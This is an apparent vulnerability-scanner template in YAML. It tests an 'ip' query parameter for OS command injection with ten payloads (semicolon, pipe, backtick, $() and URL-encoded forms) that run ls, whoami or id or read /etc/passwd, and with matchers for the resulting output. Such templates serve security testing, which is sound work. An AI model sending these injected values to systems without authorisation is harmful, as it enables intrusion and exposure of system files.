id: generic-command-injection
info:
  name: Command Injection
  severity: critical
  description: Generic OS command injection testing
  tags:
    - rce
    - command-injection
    - generic

generic:
  endpoint: "{{command_injection}}"

  method: GET

  parameter: "ip"

  payloads:
    - name: "pipe_ls"
      value: "; ls"
      description: "Semicolon with ls"

    - name: "pipe_whoami"
      value: "; whoami"
      description: "Semicolon with whoami"

    - name: "backtick_whoami"
      value: "`whoami`"
      description: "Backtick command substitution"

    - name: "dollar_ls"
      value: "$(ls)"
      description: "Dollar sign command substitution"

    - name: "and_ampersand"
      value: "&& ls"
      description: "AND operator with ls"

    - name: "pipe_operator"
      value: "| cat /etc/passwd"
      description: "Pipe to read passwd"

    - name: "semicolon_passwd"
      value: "; cat /etc/passwd"
      description: "Semicolon to read passwd"

    - name: "backtick_id"
      value: "`id`"
      description: "Backtick with id command"

    - name: "newline_injection"
      value: "%0aid"
      description: "Newline injection"

    - name: "url_encoded_pipe"
      value: "%7Cls%7C"
      description: "URL encoded pipe"

  matchers:
    # Strong indicators of command execution
    - type: word
      words:
        - "root:x:0:0"      # /etc/passwd content
        - "/bin/bash"       # which bash output
        - "/bin/sh"         # which sh output
        - "www-data"        # web server user
        - "uid="            # id command output
        - "gid="            # id command output
      condition: or

    # ls output patterns (require context)
    - type: word
      words:
        - "total "          # ls header
        - "drwxr-xr-x"      # ls directory listing
      condition: or
